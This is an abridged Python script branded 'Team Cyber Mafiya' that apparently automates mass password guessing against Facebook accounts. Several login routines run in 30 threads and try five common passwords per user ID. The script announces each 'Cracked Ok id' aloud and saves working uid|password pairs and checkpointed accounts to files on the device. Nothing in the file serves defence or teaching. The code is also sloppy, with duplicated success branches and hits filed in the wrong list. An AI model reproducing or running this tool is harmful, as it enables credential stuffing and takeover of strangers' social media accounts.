...
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:os.makedirs('/sdcard/𝐓𝐞𝐚𝐦 𝐂𝐲𝐛𝐞𝐫 𝐌𝐚𝐟𝐢𝐲𝐚')
except:
    pass
###os.system('xdg-open https://t.me/+nmBsv94-h804YjU1')
...
###os.system('xdg-open https://facebook.com/groups/1267753887859879/')
###os.system('xdg-open https://chat.whatsapp.com/K3bBmSld4x2896hPsV3Mzg?mode=ac_t')
...
###os.system('espeak -a 300 "well,come to,BILA, tools"')
logo = f"""
     \033[0;92m  _______    _____   __  __ 
     \033[0;93m |__   __|  / ____| |  \/  |
     \033[0;94m    | |    | |      | \  / |
     \033[0;95m    | |    | |      | |\/| |
     \033[0;96m    | |    | |____  | |  | |
     \033[0;97m    |_|     \_____| |_|  |_|
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[1;97m[\x1b[1;92m✪\x1b[1;97m] \x1b[1;95mOWNER      \x1b[1;91m: \x1b[1;93m𝑫𝒀𝑵𝑨𝑴𝑰𝑪 𝑫𝑬𝑽 𝑿
...
def main():
    ...
    print(f'\33[38;5;160m \033[1;93m4 \33[38;5;160m \033[1;92mOLD CLONE \33[38;5;160m   [\33[38;5;99mALL\33[38;5;160m/\33[38;5;99mSERIES\33[38;5;160m\033[1;97m]')
    linex()
    ch = input(f'\33[38;5;160m\033[1;97m\33[38;5;160m \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    if ch in ('1','01','11','A','১','০১','a','A'):
        __Old1__()
    elif ch in ('2','22','02','b','B'):
        __Old2__()
...
def __Old1__():
    ...
    with tred(max_workers=30) as jihad:
        os.system('clear');print(logo)
        print(f'\33[38;5;160m[\033[1;97m🔥\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;96m{limit}')
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            ...
            if "session_key" in rp:
                print(f'\r\r\r\r\r\33[38;5;46mSuccesfull \033[0;92m{uid} \033[0;97m● \033[0;93m{pw}              \r\r\r');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/𝐓𝐞𝐚𝐦 𝐂𝐲𝐛𝐞𝐫 𝐌𝐚𝐟𝐢𝐲𝐚/OLD-ID-M1-OK.txt", "a").write(uid+"|"+pw+"\n")    
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;208m[CP] {uid} ● {pw}                \r\r\r')
                open("/sdcard/𝐓𝐞𝐚𝐦 𝐂𝐲𝐛𝐞𝐫 𝐌𝐚𝐟𝐢𝐲𝐚/OLD-ID-M1-CP.txt", "a").write(uid + " ● " + pw + "\n")
                cps.append(uid)
                break
            elif "session_key" in rp:
                print(f'\r\r\r\r\r\33[38;5;46mSuccesfull \033[0;92m{uid} \033[0;97m● \033[0;93m{pw}                        \r\r\r')
...
def login2(uid):
    ...
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMafiya\33[38;5;37m-\x1b[38;5;46mM2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            ...
            if "session_key" in rp:                
                print(f'\r\r\r\r\r\33[38;5;46mSuccesfull \033[0;92m{uid} \033[0;97m● \033[0;93m{pw}       \r\r\r');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/𝐓𝐞𝐚𝐦 𝐂𝐲𝐛𝐞𝐫 𝐌𝐚𝐟𝐢𝐲𝐚/OLD-ID-M2-OK.txt", "a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;208mCP {uid} ● {pw}      \r\r\r')
                open("/sdcard/𝐓𝐞𝐚𝐦 𝐂𝐲𝐛𝐞𝐫 𝐌𝐚𝐟𝐢𝐲𝐚/OLD-ID-M2-CP.txt", "a").write(uid + "|" + pw + "\n")
                cps.append(uid)
                break
            elif "session_key" in rp:
                print(f'\r\r\r\r\r\33[38;5;46mSuccesfull \033[0;92m{uid} \033[0;97m● \033[0;93m{pw}          \r\r\r')
...
def login3(uid):
    ...
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMAFIYA\33[38;5;37m-\x1b[38;5;46mM3\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            ...
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:                
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSuccesfull\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m          \r\r\r');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/𝐓𝐞𝐚𝐦 𝐂𝐲𝐛𝐞𝐫 𝐌𝐚𝐟𝐢𝐲𝐚/OLD-ID-M3-OK.txt", "a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;208m[CP] {uid} ● {pw}            \r\r\r')
                open("/sdcard/𝐓𝐞𝐚𝐦 𝐂𝐲𝐛𝐞𝐫 𝐌𝐚𝐟𝐢𝐲𝐚/OLD-ID-M3-CP.txt", "a").write(uid + "|" + pw + "\n")
                cps.append(uid)
                break
            elif "session_key" in rp:
                print(f'\r\r\r\r\r\33[38;5;46m[Succesfull] {uid} ● {pw}                   \r\r\r')
                os.system('espeak -a 300 "Cracked Ok id,"')
                open("/sdcard/𝐓𝐞𝐚𝐦 𝐂𝐲𝐛𝐞𝐫 𝐌𝐚𝐟𝐢𝐲𝐚/OLD-ID-M3-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
...
def login4(uid):
    ...
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMAFIYA\33[38;5;37m-\x1b[38;5;46mM4\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            ...
            if "session_key" in rp:                
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mSuccesfull\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m            \r\r\r');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/𝐓𝐞𝐚𝐦 𝐂𝐲𝐛𝐞𝐫 𝐌𝐚𝐟𝐢𝐲𝐚/OLD-ID-M4-OK.txt", "a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;208m[CP] {uid} ● {pw}                  \r\r\r')
                open("/sdcard/𝐓𝐞𝐚𝐦 𝐂𝐲𝐛𝐞𝐫 𝐌𝐚𝐟𝐢𝐲𝐚/OLD-ID-M4-CP.txt", "a").write(uid + "|" + pw + "\n")
                cps.append(uid)
                break
            elif "session_key" in rp:
                print(f'\r\r\r\r\r\33[38;5;46m[Succesfull] {uid} ● {pw}              \r\r\r')
